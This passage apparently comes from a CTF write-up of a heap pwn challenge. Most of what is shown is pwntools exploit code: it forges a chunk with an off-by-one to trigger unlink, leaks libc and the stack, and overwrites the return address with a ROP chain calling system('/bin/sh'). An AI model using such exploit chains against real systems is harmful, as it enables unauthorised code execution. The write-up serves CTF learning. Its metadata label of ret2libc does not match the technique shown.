@@ -1,0 +1,13 @@
+---
+SOURCE: livesearch
+URL: https://akerdidik.github.io/blog/itfest-ctf-2025-writeups/
+CHALLENGE: Writeups on my PWN challenges in the ITFEST CTF 2025
+EVENT: LiveSearch
+TEAM: N/A
+CATEGORY: ret2libc
+DIFFICULTY: Unknown
+PROTECTIONS: None
+KEY_FUNCTIONS: free, system
+KEY_TECHNIQUE: Writeup for Writeups on my PWN challenges in the ITFEST CTF 2025 — ret2libc exploitation technique.
+---
+umber 1 37 38 payload = b '' 39 payload += p64( 0 ) # prev_size of previous chunk, we dont care for it 40 payload += p64( 0x 410 ) # size of chunk we faking 41 payload += p64(fd) + p64(bk) # fd and bk respectfully 42 payload += p8( 0 ) * ( 0x 418 - 40 ) # fill up to prev_size 43 payload += p64(prev_size) # faking prev_size to be 0x410 44 payload += p8(fake_size) # overflowing chunk 1 to replace 0x421 to 0x420, and null prev_in_use bit 45 46 edit(p, 0 , payload) # 4-th usage option 47 free(p, 1 ) # 5-th usage option, 1 free usage, triggers unlink on chunk 0 48 49 edit(p, 0 , p64( 0 ) * 3 + p64( 0x 404050 ) + p64(exe.got.puts)) # 6 usage option 50 view(p, 1 ) # 7 usage option, leaking libc 51 52 p.recvuntil( b '=== \n ' ) 53 54 puts_leak = u64(p.recv( 6 ).ljust( 8 , b ' \x00 ' )) 55 libc.address = puts_leak - libc.sym.puts 56 print ( f "Libc leak: {hex (puts_leak) } " ) 57 print ( f "Libc address: {hex (libc.address) } " ) 58 59 edit(p, 0 , p64( 0x 404050 ) + p64(libc.sym.environ)) # 8 usage option 60 view(p, 1 ) # 9 usage option 61 62 p.recvuntil( b '=== \n ' ) 63 64 environ = u64(p.recv( 6 ).ljust( 8 , b ' \x00 ' )) 65 stack = environ - 360 # stack until nearly our RIP 66 print ( f "Environ loc: {hex (environ) } " ) 67 print ( f "Stack: {hex (stack) } " ) 68 69 edit(p, 0 , p64( 0x 404050 ) + p64(stack + 24 )) # 10 usage option 70 71 pop_rdi_ret = libc.address + 0x 000000000010f78b 72 bin_sh_addr = next (libc.search( b '/bin/sh \x00 ' )) 73 ret_gadget = libc.address + 0x 000000000002882f 74 75 payload = flat( 76 pop_rdi_ret, 77 bin_sh_addr, 78 ret_gadget, 79 libc.sym.system 80 ) 81 edit(p, 1 , payload) # 11 usage option, final RCE, will overwrite RIP with our ROP chain and give us shell 82 83 p.interactive() Key Takeaways Understand binary behaviour Identify vulnerability - Off By One in the heap Bypass Unsafe Unlink security mitigations and perform Safe Unlink :) References Unsafe Unlink in more details 2. MAX MAX Description TU TU TU TUTU Solution Initial Checks Th
